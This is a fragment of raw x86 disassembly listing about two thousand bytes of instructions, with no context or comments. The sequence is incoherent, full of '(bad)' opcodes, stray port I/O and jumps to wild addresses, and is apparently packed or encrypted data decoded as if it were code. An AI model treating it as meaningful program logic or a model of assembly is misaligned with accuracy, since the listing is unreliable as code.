  4125c6:	jmp    0xc98c:0x429a38a9
  4125cd:	js     0x41255d
  4125cf:	pop    edi
  4125d0:	pop    ebp
  4125d1:	sub    al,0x99
  4125d3:	jo     0x412613
  4125d5:	jo     0x412652
  4125d7:	mov    ds:0x81edd357,al
  4125dc:	fs push esp
  4125de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4125df:	inc    ebp
  4125e0:	sbb    eax,0xb04f2557
  4125e5:	cmp    al,0x95
  4125e7:	sahf   
  4125e8:	imul   ebp,DWORD PTR [edi],0x7e563319
  4125ee:	in     al,0x15
  4125f0:	jl     0x412610
  4125f2:	push   es
  4125f3:	push   0xeed8c47d
  4125f8:	mov    ebx,0x63199e29
  4125fd:	pop    edx
  4125fe:	fs stos BYTE PTR es:[edi],al
  412600:	arpl   WORD PTR [edx],si
  412602:	and    al,0xa9
  412604:	add    DWORD PTR [edi-0x55fea729],ebx
  41260a:	mov    eax,0xef4d733b
  41260f:	jmp    0x412638
  412611:	mov    ds:0xd0bbe594,eax
  412616:	sahf   
  412617:	popf   
  412618:	ret    0x2b88
  41261b:	mov    eax,ds:0x39c9e75d
  412620:	fld    DWORD PTR [ebx-0x11]
  412623:	ds mov edx,0x650f510d
  412629:	jg     0x412628
  41262b:	xlat   BYTE PTR ds:[ebx]
  41262c:	add    edi,ebp
  41262e:	and    edx,DWORD PTR [ebx+0x34f3a3d9]
  412634:	(bad)  
  412635:	pushf  
  412636:	sahf   
  412637:	mov    ebx,0x8529227d
  41263c:	test   BYTE PTR [ebp+0x2ef5db03],ah
  412642:	inc    edx
  412643:	retf   0xb3d4
  412646:	mov    ch,0x95
  412648:	das    
  412649:	aaa    
  41264a:	sbb    DWORD PTR [eax+0x68],eax
  41264d:	cmp    eax,ebp
  41264f:	es es dec esi
  412652:	imul   esi,DWORD PTR [esi+0x7b36adda],0xffffffb1
  412659:	and    BYTE PTR [esi+0x69e23d84],cl
  41265f:	pop    edx
  412660:	cmp    al,cl
  412662:	sbb    esp,DWORD PTR [edx-0x1d]
  412665:	ins    BYTE PTR es:[edi],dx
  412666:	call   0x9ec98976
  41266b:	pop    esp
  41266c:	js     0x412696
  41266e:	hlt    
  41266f:	cmp    eax,0x44d0339b
  412674:	test   eax,0x4258d467
  412679:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41267a:	push   edi
  41267b:	repnz pop es
  41267d:	mov    ?,WORD PTR [edx+0x60bfa59d]
  412683:	jne    0x4126ca
  412685:	xchg   esp,eax
  412686:	jns    0x4126c0
  412688:	add    bp,dx
  41268b:	or     dl,BYTE PTR [edx+eiz*1]
  41268e:	cwde   
  41268f:	(bad)  
  412690:	sub    eax,0x9f7879f8
  412695:	dec    ebp
  412696:	adc    al,0xd7
  412698:	fs jo  0x4126ff
  41269b:	adc    ah,0x86
  41269e:	sbb    esp,DWORD PTR [ebx-0x3cad0688]
  4126a4:	and    ecx,DWORD PTR [edx-0x33e018a6]
  4126aa:	(bad)  
  4126ab:	or     eax,edx
  4126ad:	outs   dx,DWORD PTR ds:[esi]
  4126ae:	inc    ebx
  4126af:	ss es jg 0x4126ec
  4126b3:	out    dx,al
  4126b4:	xlat   BYTE PTR ds:[ebx]
  4126b5:	sub    al,0xc1
  4126b7:	adc    ah,BYTE PTR [edx-0x2a4732ed]
  4126bd:	xlat   BYTE PTR ds:[ebx]
  4126be:	xchg   ebx,eax
  4126bf:	jns    0x4126a0
  4126c1:	pop    es
  4126c2:	xor    BYTE PTR [esp+edx*8],ch
  4126c5:	inc    ebp
  4126c6:	(bad)  
  4126c7:	or     edi,esi
  4126c9:	or     BYTE PTR [ecx+0x4ce9590c],cl
  4126cf:	in     eax,0xc7
  4126d1:	pop    ebp
  4126d2:	or     ebx,DWORD PTR ds:[ecx-0x4d]
  4126d6:	pop    ss
  4126d7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4126d8:	xchg   dl,bl
  4126da:	pop    ss
  4126db:	xor    ebp,edi
  4126dd:	dec    esp
  4126de:	or     ebx,0x32
  4126e1:	jae    0x4126ec
  4126e3:	dec    DWORD PTR [ecx+0x28]
  4126e6:	adc    BYTE PTR [edx],al
  4126e8:	mov    ?,WORD PTR [eax+0x298781c3]
  4126ee:	mov    bl,0xb4
  4126f0:	sbb    al,BYTE PTR [eax+0x44d07edc]
  4126f6:	pop    ecx
  4126f7:	into   
  4126f8:	mov    dh,0xd8
  4126fa:	int3   
  4126fb:	cwde   
  4126fc:	cmc    
  4126fd:	fcomp  DWORD PTR ds:0x42f5fb7
  412703:	inc    eax
  412704:	jg     0x4126c7
  412706:	push   es
  412707:	(bad)  
  412708:	sub    cl,BYTE PTR [ecx]
  41270a:	and    dl,BYTE PTR [esi-0x792b90e1]
  412710:	punpcklwd mm2,DWORD PTR ds:[ecx+0x254cb088]
  412718:	xor    eax,0x61c7ea71
  41271d:	inc    esi
  41271e:	sub    al,0x6b
  412720:	dec    edi
  412721:	push   ss
  412722:	mov    al,ds:0xe6d79598
  412727:	arpl   bp,bp
  412729:	in     al,dx
  41272a:	call   0x1be20a54
  41272f:	mov    ah,0x34
  412731:	lea    esi,[eax-0x50]
  412734:	push   ebx
  412735:	adc    eax,esi
  412737:	fld    DWORD PTR [edx+0x3c]
  41273a:	arpl   WORD PTR [ebp-0x62a013e7],cx
  412740:	pop    ebx
  412741:	lahf   
  412742:	and    edx,DWORD PTR [ebx]
  412744:	mov    ds:0x3348e921,al
  412749:	sub    DWORD PTR [esp+esi*8],ecx
  41274c:	sar    cl,1
  41274e:	cmp    esi,ebp
  412750:	xchg   BYTE PTR [edx],ah
  412752:	mov    dl,0x68
  412754:	jmp    0xcbca0ef7
  412759:	into   
  41275a:	mov    ecx,0xa69c9f65
  41275f:	inc    ebp
  412760:	inc    edi
  412761:	sub    cl,bh
  412763:	sbb    BYTE PTR [ebx-0x16098eb5],ah
  412769:	or     BYTE PTR [ecx-0x25],bl
  41276c:	shr    BYTE PTR [edi],0xdc
  41276f:	leave  
  412770:	enter  0xc220,0x9b
  412774:	sub    DWORD PTR [ecx+0x43],ebx
  412777:	fdivr  DWORD PTR [eax+0x7061c2f9]
  41277d:	retf   0x637c
  412780:	lea    esp,[ebx+0x2eaf62a7]
  412786:	push   edx
  412787:	sti    
  412788:	out    dx,al
  412789:	push   ds
  41278a:	sbb    DWORD PTR [ebx+eiz*1+0x5c87b634],0xffffff96
  412792:	dec    esp
  412793:	or     BYTE PTR [edx+ecx*8],dh
  412796:	rol    BYTE PTR [ecx+0x3a],1
  412799:	dec    edi
  41279a:	mov    dh,0xeb
  41279c:	or     eax,0x33c5419b
  4127a1:	ss das 
  4127a3:	stc    
  4127a4:	cmc    
  4127a5:	push   es
  4127a6:	cmp    eax,DWORD PTR [eax+0x6f]
  4127a9:	enter  0xa745,0xa2
  4127ad:	leave  
  4127ae:	repz iret 
  4127b0:	(bad)  
  4127b2:	(bad)  
  4127b3:	fsubr  st(5),st
  4127b5:	push   cs
  4127b6:	test   al,0x31
  4127b8:	mov    edx,0xa0552ab5
  4127bd:	push   0x43
  4127bf:	adc    BYTE PTR [edx+0x18],0xa2
  4127c3:	pop    ss
  4127c4:	mov    edx,0x35a7a6a3
  4127c9:	jb     0x41275e
  4127cb:	jne    0x4127f4
  4127cd:	outs   dx,DWORD PTR ds:[esi]
  4127ce:	pop    ds
  4127cf:	mov    esp,0x6182079d
  4127d4:	mov    ds:0x452af0fd,eax
  4127d9:	test   ebp,ebx
  4127db:	jge    0x4127c5
  4127dd:	and    al,0x60
  4127df:	out    dx,eax
  4127e0:	push   es
  4127e1:	(bad)  
  4127e2:	jmp    0xe02ae066
  4127e7:	sub    BYTE PTR [esi-0x67],ah
  4127ea:	cdq    
  4127eb:	not    ch
  4127ed:	inc    ecx
  4127ee:	mov    ecx,0x40aed7ee
  4127f3:	rcr    BYTE PTR [esi+0x31],0x94
  4127f7:	sub    bl,BYTE PTR [esi]
  4127f9:	mov    dl,0x1b
  4127fb:	mov    edi,0x6db3a875
  412800:	dec    ecx
  412801:	sbb    BYTE PTR [edi-0x49c739c0],bh
  412807:	and    DWORD PTR [ebx-0x6883fbb8],edi
  41280d:	hlt    
  41280e:	stos   DWORD PTR es:[edi],eax
  41280f:	sbb    DWORD PTR [eax],ebx
  412811:	adc    DWORD PTR [esi-0x278f3c08],edi
  412817:	fst    DWORD PTR [edx+eiz*1-0x7c2bb5be]
  41281e:	shr    BYTE PTR [edx+edi*8-0x72e28f0f],0xd6
  412826:	mov    esi,0x38ced7be
  41282b:	fcom   QWORD PTR [edx-0x5d0ab79d]
  412831:	jge    0x41289f
  412833:	xchg   DWORD PTR [edx+0xd],edi
  412836:	adc    eax,DWORD PTR [edi-0x541ee155]
  41283c:	loope  0x412836
  41283e:	mov    cl,0xd5
  412840:	sbb    ebx,DWORD PTR [ebx*1+0x2e53233]
  412847:	gs push es
  412849:	xchg   esi,eax
  41284a:	jp     0x412858
  41284c:	(bad)  
  41284d:	mov    dl,0x51
  41284f:	jle    0x41286f
  412851:	adc    edi,DWORD PTR [eax+0x48]
  412854:	mov    cs,esp
  412856:	pop    ebx
  412857:	dec    esp
  412858:	les    edi,FWORD PTR [ebx-0x45]
  41285b:	rol    BYTE PTR [bp+si+0xfd6],cl
  412860:	rol    DWORD PTR [ebx],cl
  412862:	dec    eax
  412863:	fucomi st,st(2)
  412865:	gs ret 0x95d9
  412869:	and    eax,0x32dfe254
  41286e:	inc    edx
  41286f:	jne    0x412878
  412871:	sbb    al,0xe0
  412873:	int3   
  412874:	and    cl,ch
  412876:	xchg   esi,eax
  412877:	(bad)  
  412878:	out    dx,eax
  412879:	pop    ebp
  41287a:	jae    0x4128e9
  41287c:	lea    ebx,[edi+0x7be7c8d1]
  412882:	ret    0x8070
  412885:	xlat   BYTE PTR ds:[ebx]
  412886:	adc    al,0x5d
  412888:	dec    edx
  412889:	ins    DWORD PTR es:[edi],dx
  41288a:	add    al,BYTE PTR [edi+0x5b6900a1]
  412890:	cmc    
  412891:	push   eax
  412892:	and    al,0x13
  412894:	fnstcw WORD PTR [esi+0x7603a846]
  41289a:	data16 adc BYTE PTR [edx-0x1d],dl
  41289e:	std    
  41289f:	inc    edx
  4128a0:	cmp    DWORD PTR [ecx-0x3978087c],edx
  4128a6:	or     dl,0x23
  4128a9:	add    esp,DWORD PTR [esi+0x50]
  4128ac:	and    al,0xc3
  4128ae:	cmovge esi,ebx
  4128b1:	test   al,0xcf
  4128b3:	test   bl,0xe9
  4128b6:	fidiv  DWORD PTR [ecx+edx*2-0x4e]
  4128ba:	jge    0x412920
  4128bc:	mov    esp,0xbb87f5f8
  4128c1:	inc    edx
  4128c2:	mov    eax,ds:0x66a1f3cd
  4128c8:	dec    esp
  4128c9:	not    BYTE PTR [eax+ebx*2]
  4128cc:	imul   esi,DWORD PTR [esi],0x1ec5f654
  4128d2:	add    cl,BYTE PTR [eax+0x3908d85a]
  4128d8:	pop    ebp
  4128d9:	test   eax,0x2970d0c0
  4128de:	cmp    esp,eax
  4128e0:	scas   eax,DWORD PTR es:[edi]
  4128e1:	test   eax,0xa8b0bda8
  4128e6:	push   0xe6086443
  4128eb:	(bad)  
  4128ec:	jp     0x412879
  4128ee:	ffreep st(3)
  4128f0:	jge    0x4128a0
  4128f2:	adc    BYTE PTR [eax+ebx*4],ah
  4128f5:	fstp   DWORD PTR [edx+0x74]
  4128f8:	loope  0x41289e
  4128fa:	dec    eax
  4128fb:	pop    esi
  4128fc:	repz and dh,BYTE PTR [edx]
  4128ff:	shl    DWORD PTR [edi+0x25e4eead],1
  412905:	retf   0x59a6
  412908:	mov    al,ds:0x658f7de3
  41290d:	inc    esp
  41290e:	mov    dl,0x3a
  412910:	rcr    dh,cl
  412912:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  412914:	adc    ebx,ecx
  412916:	por    mm5,QWORD PTR [eax+0xf]
  41291a:	jmp    0x6a06:0x5de6170a
  412921:	add    al,0xe5
  412923:	xor    dh,ch
  412925:	hlt    
  412926:	sbb    al,0xb7
  412928:	xchg   ebp,eax
  412929:	pop    es
  41292a:	sahf   
  41292b:	dec    eax
  41292c:	gs xor eax,0xf6b694c3
  412932:	pushf  
  412933:	lock clc 
  412935:	fst    DWORD PTR [ecx+0x0]
  412938:	popa   
  412939:	popa   
  41293a:	(bad)  
  41293b:	mov    ds:0x437268f7,al
  412940:	das    
  412941:	div    DWORD PTR [eax]
  412943:	pop    edi
  412944:	mov    ah,0x76
  412946:	xchg   esi,eax
  412947:	xchg   esi,eax
  412948:	fwait
  412949:	dec    edi
  41294a:	sub    eax,0x5d037048
  41294f:	scas   al,BYTE PTR es:[edi]
  412950:	push   ebp
  412951:	enter  0x7869,0x40
  412955:	arpl   WORD PTR [ebp+0x7c81aeea],dx
  41295b:	push   ss
  41295c:	ret    0x4494
  41295f:	out    dx,eax
  412960:	cmp    al,BYTE PTR [edx]
  412962:	dec    edi
  412963:	stos   BYTE PTR es:[edi],al
  412964:	pusha  
  412965:	cmp    ch,BYTE PTR [ebx]
  412967:	jo     0x4129b1
  412969:	fdiv   QWORD PTR [esi+eax*8]
  41296c:	xchg   esp,eax
  41296d:	div    BYTE PTR [eax+0x4de35487]
  412973:	scas   eax,DWORD PTR es:[edi]
  412974:	(bad)
  412978:	mov    dh,0x6c
  41297a:	retf   
  41297b:	call   esp
  41297d:	dec    esi
  41297e:	sbb    dl,ah
  412980:	adc    BYTE PTR [edi+0x68],dh
  412983:	adc    dl,BYTE PTR [ebp+ecx*1+0x18]
  412987:	or     esi,eax
  412989:	adc    al,0x5d
  41298b:	push   ecx
  41298c:	push   esp
  41298d:	unpckhps xmm3,XMMWORD PTR [edx]
  412990:	into   
  412991:	xor    DWORD PTR [ecx+0x304e2d2],ecx
  412997:	xchg   DWORD PTR [ecx+0x16],ebx
  41299a:	or     eax,0xec07e248
  41299f:	inc    eax
  4129a0:	sbb    DWORD PTR [ebp-0x28b98077],ecx
  4129a6:	cwde   
  4129a7:	les    esp,FWORD PTR [edi+0x25d6fe9a]
  4129ad:	rol    DWORD PTR [ebx-0x7d],1
  4129b0:	pop    eax
  4129b1:	add    eax,0x92ffba8
  4129b6:	push   ds
  4129b7:	arpl   cx,sp
  4129b9:	setno  cl
  4129bc:	inc    ebx
  4129bd:	daa    
  4129be:	call   0x26db:0x88b27195
  4129c5:	mov    db2,edi
  4129c8:	lea    ebp,[esp+esi*4]
  4129cb:	cmp    ebp,DWORD PTR [edx]
  4129cd:	or     DWORD PTR [edx-0x38],0x3b
  4129d1:	push   ds
  4129d2:	jae    0x412a36
  4129d4:	jb     0x4129dd
  4129d6:	sub    al,0x61
  4129d8:	rol    bl,cl
  4129da:	and    edi,DWORD PTR [eax-0x3472646c]
  4129e0:	push   ecx
  4129e1:	lds    edx,FWORD PTR [edx-0x3c34bb44]
  4129e7:	push   edi
  4129e8:	cmc    
  4129e9:	mov    edi,0xaeb34e2e
  4129ee:	sub    ah,0x9
  4129f1:	mov    ds:0x6e714053,eax
  4129f6:	shl    DWORD PTR ds:0xd3dd4a35,0xec
  4129fd:	adc    cl,ch
  4129ff:	cmc    
  412a00:	push   ebp
  412a01:	xchg   edx,eax
  412a02:	inc    ebx
  412a03:	mov    esp,0x510203c6
  412a08:	xor    al,0xb1
  412a0a:	dec    ebx
  412a0b:	jo     0x412a63
  412a0d:	mov    eax,0x432fe50c
  412a12:	test   al,0xdb
  412a14:	push   ds
  412a15:	xor    DWORD PTR ds:0xb0a79920,edx
  412a1b:	and    ebx,edi
  412a1d:	jnp    0x412a44
  412a1f:	dec    ebx
  412a20:	push   ebp
  412a21:	(bad)  
  412a22:	jge    0x4129ac
  412a24:	jecxz  0x4129fc
  412a26:	push   edi
  412a27:	mov    edx,ds
  412a29:	ror    esp,cl
  412a2b:	and    ebx,DWORD PTR [edx]
  412a2d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412a2e:	data16 mov cl,0x8a
  412a31:	sub    BYTE PTR [ecx-0x60],cl
  412a34:	add    esi,DWORD PTR [eax-0x2]
  412a37:	and    edi,edx
  412a39:	cmp    eax,0x5cfe1a22
  412a3e:	ret    
  412a3f:	loopne 0x4129d9
  412a41:	jmp    0x412a71
  412a43:	or     al,0x67
  412a45:	neg    edi
  412a47:	repz jno 0x412a44
  412a4a:	cli    
  412a4b:	sub    DWORD PTR [ecx-0x30fa10a1],ecx
  412a51:	stos   DWORD PTR es:[edi],eax
  412a52:	inc    edi
  412a53:	retf   
  412a54:	cld    
  412a55:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412a56:	rcpps  xmm3,XMMWORD PTR ds:0xdacfb41f
  412a5d:	(bad)  
  412a5e:	(bad)  
  412a5f:	mov    esi,0xd155b4e9
  412a64:	gs into 
  412a66:	(bad)  [esp+edi*4]
  412a69:	jne    0x412a94
  412a6b:	xchg   ebx,eax
  412a6c:	cmp    eax,0x87f6670f
  412a71:	aam    0x30
  412a73:	xchg   edi,eax
  412a74:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412a75:	inc    ebp
  412a76:	push   es
  412a77:	shl    BYTE PTR [ecx],1
  412a79:	and    eax,DWORD PTR [ebx]
  412a7b:	adc    bh,ch
  412a7d:	xor    eax,0x13845986
  412a82:	jns    0x412a90
  412a84:	add    ebx,ebp
  412a86:	stc    
  412a87:	sahf   
  412a88:	lahf   
  412a89:	xchg   edx,eax
  412a8a:	inc    esp
  412a8b:	pop    edi
  412a8c:	push   ebp
  412a8d:	mov    ecx,0xd22cf4dc
  412a92:	fsubp  st(1),st
  412a94:	or     BYTE PTR [eax-0x2aebc0f8],al
  412a9a:	fdiv   QWORD PTR [ebx-0x234e8d94]
  412aa0:	cmp    BYTE PTR [edx-0x4c199a06],0x7c
  412aa7:	and    al,0xe3
  412aa9:	cmp    cl,BYTE PTR [ecx-0x15]
  412aac:	push   0xffffffdb
  412aae:	lahf   
  412aaf:	and    al,0x80
  412ab1:	push   ecx
  412ab2:	adc    al,0xbb
  412ab4:	test   ecx,esi
  412ab6:	leave  
  412ab7:	div    ebp
  412ab9:	jp     0x412a70
  412abb:	add    eax,0xae4e8476
  412ac0:	repz jg 0x412b00
  412ac3:	push   ecx
  412ac4:	mov    DWORD PTR [ebx+0x75f89f28],esp
  412aca:	push   ebx
  412acb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412acc:	push   esi
  412acd:	loope  0x412b31
  412acf:	xor    al,0x1c
  412ad1:	adc    al,0xa7
  412ad3:	ror    BYTE PTR [ebp-0x75],cl
  412ad6:	jg     0x412b36
  412ad8:	sub    al,0xb1
  412ada:	inc    ebx
  412adb:	jns    0x412abd
  412add:	push   ebp
  412ade:	sub    ebx,DWORD PTR [edx]
  412ae0:	mov    al,ds:0x821d9501
  412ae5:	clc    
  412ae6:	push   edx
  412ae7:	dec    ebp
  412ae8:	mov    edx,0xf4c9ea09
  412aed:	adc    BYTE PTR [ebp+0x482c80b8],dh
  412af3:	mov    dh,0x61
  412af5:	sub    BYTE PTR [edx-0x1c],bl
  412af8:	fwait
  412af9:	shr    DWORD PTR [eax],0x94
  412afc:	es pop esp
  412afe:	stc    
  412aff:	add    eax,0xfd8edfee
  412b04:	pop    ds
  412b05:	cmc    
  412b06:	aam    0x1f
  412b08:	add    eax,0xc0f00556
  412b0d:	rcr    BYTE PTR [edx],cl
  412b0f:	test   bl,ah
  412b11:	sub    BYTE PTR [ecx],bl
  412b13:	dec    ebp
  412b14:	jns    0x412b00
  412b16:	mov    cl,0xcf
  412b18:	inc    edi
  412b19:	mov    edi,0xe38aecfc
  412b1e:	(bad)  
  412b20:	fdiv   DWORD PTR [edi+0x1eafeb66]
  412b26:	pop    edi
  412b27:	scas   eax,DWORD PTR es:[edi]
  412b28:	leave  
  412b29:	icebp  
  412b2a:	jb     0x412ba7
  412b2c:	rol    ah,1
  412b2e:	aas    
  412b2f:	js     0x412b7c
  412b31:	mov    ?,WORD PTR [edx]
  412b33:	mov    eax,DWORD PTR [ebx-0x512e394]
  412b39:	adc    eax,0xf6f636e1
  412b3e:	mov    ebx,0xf92d8715
  412b43:	dec    eax
  412b44:	sub    eax,0x8c16a7e5
  412b49:	int3   
  412b4a:	jl     0x412b79
  412b4c:	cmp    DWORD PTR [eax-0xb6ef6af],0xfffffff3
  412b53:	in     al,dx
  412b54:	add    al,0x61
  412b56:	stos   BYTE PTR es:[edi],al
  412b57:	repz xor eax,0x17e36de5
  412b5d:	rcl    BYTE PTR [eax+0x669f92c7],cl
  412b63:	push   esp
  412b64:	sub    eax,0xc21f5dc0
  412b69:	pop    ebx
  412b6a:	mov    ds:0x9008fff8,al
  412b6f:	push   ebp
  412b70:	jle    0x412b96
  412b72:	xchg   BYTE PTR [edx],bh
  412b74:	adc    DWORD PTR [ebp-0x2f0b2cd9],0x17
  412b7b:	inc    ebx
  412b7c:	repnz iret 
  412b7e:	push   ss
  412b7f:	xchg   edx,eax
  412b80:	adc    DWORD PTR [edi+0x47d8ddb9],0xb5f488f
  412b8a:	mov    bl,0x21
  412b8c:	pop    ebp
  412b8d:	xchg   ecx,eax
  412b8e:	imul   eax,ecx,0x6
  412b91:	or     ebp,ebx
  412b93:	gs repz mov edi,0x3f69d747
  412b9a:	push   cs
  412b9b:	push   esi
  412b9c:	ror    DWORD PTR ds:0xac906eed,0x33
  412ba3:	mov    bl,0xa
  412ba5:	mov    al,ds:0x8f6f34de
  412baa:	pushf  
  412bab:	pop    esi
  412bac:	jp     0x412b69
  412bae:	xor    esi,DWORD PTR [edx+edx*8+0x3d7b0d40]
  412bb5:	pop    ds
  412bb6:	fsubr  st,st(7)
  412bb8:	add    edi,DWORD PTR [esi-0x33fc6c1]
  412bbe:	cmp    al,0xe1
  412bc0:	pop    eax
  412bc1:	ret    
  412bc2:	pop    esp
  412bc3:	xchg   esi,eax
  412bc4:	adc    ch,BYTE PTR [esi+esi*1-0x52d474f1]
  412bcb:	adc    al,al
  412bcd:	add    al,BYTE PTR [ebp+0xb]
  412bd0:	scas   eax,DWORD PTR es:[edi]
  412bd1:	cmp    eax,0xe91ff6d6
  412bd6:	dec    esp
  412bd7:	inc    edi
  412bd8:	sbb    al,0xfa
  412bda:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412bdb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412bdc:	push   es
  412bdd:	and    eax,eax
  412bdf:	or     BYTE PTR [esp+ebx*4-0x31aeecc1],bl
  412be6:	lea    esi,[ecx]
  412be8:	(bad)  
  412be9:	repnz repnz push eax
  412bec:	(bad)  
  412bed:	sbb    ah,BYTE PTR [esi+0x2a]
  412bf0:	mov    esp,0x8d0e64b6
  412bf5:	in     eax,dx
  412bf6:	(bad)  
  412bf7:	sar    BYTE PTR [eax],1
  412bf9:	pop    es
  412bfa:	sbb    ebp,0x4a39b322
  412c00:	adc    cl,bh
  412c02:	outs   dx,DWORD PTR ds:[esi]
  412c03:	stos   BYTE PTR es:[edi],al
  412c04:	inc    esi
  412c05:	and    eax,ecx
  412c07:	jnp    0x412c0d
  412c09:	xlat   BYTE PTR ds:[ebx]
  412c0a:	add    dh,ch
  412c0c:	inc    ebp
  412c0d:	das    
  412c0e:	dec    ecx
  412c0f:	pushf  
  412c10:	ret    0x1430
  412c13:	hlt    
  412c14:	retf   0x557c
  412c17:	test   al,0xc4
  412c19:	inc    ecx
  412c1a:	lds    esi,FWORD PTR [edi+0x2d]
  412c1d:	stos   BYTE PTR es:[edi],al
  412c1e:	imul   eax,DWORD PTR [ebp+0x4d0d5d22],0x6e
  412c25:	imul   ebx,DWORD PTR ds:0xec5864c5,0xffffffef
  412c2c:	jmp    0x412bdf
  412c2e:	mov    ?,ecx
  412c30:	imul   ax,WORD PTR [eax+ebx*2],0xffdb
  412c35:	xchg   esp,edi
  412c37:	sbb    BYTE PTR [eax],cl
  412c39:	pop    ebp
  412c3a:	dec    DWORD PTR [edx]
  412c3c:	mov    eax,0x952e9e8a
  412c41:	aaa    
  412c42:	mov    al,ds:0x1891ce1
  412c47:	js     0x412c1a
  412c49:	(bad)  
  412c4a:	cli    
  412c4b:	rol    al,1
  412c4d:	adc    cl,al
  412c4f:	sub    dl,BYTE PTR [ecx]
  412c51:	cmp    BYTE PTR [edx],dl
  412c53:	adc    dh,BYTE PTR [edx+0x26]
  412c56:	repz add al,0x86
  412c59:	xlat   BYTE PTR ds:[ebx]
  412c5a:	aaa    
  412c5b:	inc    ecx
  412c5c:	xchg   ebx,eax
  412c5d:	xchg   BYTE PTR [edi-0x4333eff2],bh
  412c63:	inc    edx
  412c64:	jo     0x412c0f
  412c66:	mov    edi,0xaa8ff1c5
  412c6b:	jnp    0x412ce6
  412c6d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412c6e:	add    al,0x3d
  412c70:	(bad)  
  412c71:	push   ds
  412c72:	pop    eax
  412c73:	sub    dh,BYTE PTR [ebp+0x3fb68653]
  412c79:	push   eax
  412c7a:	mov    al,0xc5
  412c7c:	sbb    bl,BYTE PTR [edi-0x36]
  412c7f:	bound  ecx,QWORD PTR [esi]
  412c81:	into   
  412c82:	inc    BYTE PTR [edi+edi*8-0x3208fb9f]
  412c89:	jns    0x412c7b
  412c8b:	shr    DWORD PTR [ebp+0x64d29127],cl
  412c91:	bound  ecx,QWORD PTR [esi-0xf6ce6a1]
  412c97:	(bad)  
  412c98:	test   eax,0x567a75e
  412c9d:	xchg   edi,eax
  412c9e:	shl    BYTE PTR [esi+0x5f],0x3a
  412ca2:	scas   al,BYTE PTR es:[edi]
  412ca3:	mov    dl,0x1d
  412ca5:	ds dec eax
  412ca7:	enter  0x737b,0x92
  412cab:	retf   
  412cac:	adc    al,0xcc
  412cae:	loop   0x412d0f
  412cb0:	add    bl,BYTE PTR [esi-0x3013db17]
  412cb6:	arpl   di,si
  412cb8:	std    
  412cb9:	shr    DWORD PTR [ebx+ebp*2],cl
  412cbc:	icebp  
  412cbd:	out    0xe6,al
  412cbf:	arpl   ax,di
  412cc1:	loop   0x412d11
  412cc3:	dec    ebp
  412cc4:	mov    BYTE PTR [ebp-0x32559c71],ah
  412cca:	sbb    esp,DWORD PTR ds:0xfbb967d3
  412cd0:	pop    ds
  412cd1:	mov    ds:0x8aab559d,eax
  412cd6:	rcr    BYTE PTR [ebp-0x26],cl
  412cd9:	and    eax,0x89a9fe29
  412cde:	test   bl,al
  412ce0:	(bad)  
  412ce1:	mov    dl,0xca
  412ce3:	leave  
  412ce4:	and    al,dh
  412ce6:	aaa    
  412ce7:	mov    dh,0x2
  412ce9:	(bad)  
  412cea:	out    0x26,al
  412cec:	fiadd  WORD PTR [ecx]
  412cee:	sahf   
  412cef:	push   0xdade2537
  412cf4:	and    eax,0xf496aaf7
  412cf9:	xchg   esi,eax
  412cfa:	cli    
  412cfb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412cfc:	test   BYTE PTR [ecx],0x2f
  412cff:	ins    DWORD PTR es:[edi],dx
  412d00:	sbb    al,0xcc
  412d02:	mov    cl,0x35
  412d04:	pop    ecx
  412d05:	clc    
  412d06:	(bad)  
  412d07:	jb     0x412cf8
  412d09:	cmp    esp,esp
  412d0b:	in     eax,0xd2
  412d0d:	xlat   BYTE PTR ds:[ebx]
  412d0e:	aam    0xe5
  412d10:	out    0xdf,eax
  412d12:	ret    0xc50a
  412d15:	je     0x412d41
  412d17:	jbe    0x412d7e
  412d19:	js     0x412d72
  412d1b:	jp     0x412cbf
  412d1d:	sar    DWORD PTR [esi+0x4],cl
  412d20:	pop    ebp
  412d21:	xlat   BYTE PTR ds:[ebx]
  412d22:	mov    DWORD PTR [eax+edi*4+0x645d34e],eax
  412d29:	mov    eax,ds:0x988df5a7
  412d2e:	xchg   ebp,eax
  412d2f:	adc    al,0xc1
  412d31:	mov    ecx,0x537cc892
  412d36:	xor    DWORD PTR ds:0x2af24e06,esp
  412d3c:	fstp   DWORD PTR [eax+ebx*8+0x44]
  412d40:	jo     0x412d41
  412d42:	int    0xb
  412d44:	outs   dx,BYTE PTR ds:[esi]
  412d45:	or     edx,edx
  412d47:	test   ah,0xb8
  412d4a:	xlat   BYTE PTR ds:[ebx]
  412d4b:	outs   dx,BYTE PTR ds:[esi]
  412d4c:	ret    0xdf37
  412d4f:	repz addr16 in eax,dx
  412d52:	ins    DWORD PTR es:[edi],dx
  412d53:	push   ecx
  412d54:	cmp    ah,BYTE PTR [eax-0x1f]
  412d57:	hlt    
  412d58:	sbb    esp,edi
  412d5a:	inc    esi
  412d5b:	dec    ecx
  412d5c:	push   ebx
  412d5d:	or     cl,BYTE PTR [ebp+0x5d]
  412d60:	dec    ebp
  412d61:	pop    es
  412d62:	js     0x412cf3
  412d64:	not    dl
  412d66:	cli    
  412d67:	aaa    
  412d68:	push   0xfffffff9
  412d6a:	xchg   edi,eax
  412d6b:	outs   dx,BYTE PTR ds:[esi]
  412d6c:	test   eax,0xdb86a9d1
  412d71:	inc    edi
  412d72:	cmp    dh,BYTE PTR [edi+edi*1+0x33]
  412d76:	mov    dh,0x11
  412d78:	adc    eax,0xf2abe80b
  412d7d:	mov    ah,0xe6
  412d7f:	in     eax,0xf9
  412d81:	mul    DWORD PTR [edi+0x7c4365b5]
  412d87:	dec    edx
  412d88:	xchg   esi,esi
  412d8a:	pusha  
  412d8b:	mov    cl,0xaf
  412d8d:	xchg   edx,eax
  412d8e:	and    al,0x86
  412d90:	loopne 0x412d97
  412d92:	pop    edi
  412d93:	data16 out 0x49,al
  412d96:	or     eax,0xb9e74046
  412d9b:	outs   dx,BYTE PTR ds:[esi]
  412d9c:	or     edx,ebx
  412d9e:	dec    esi
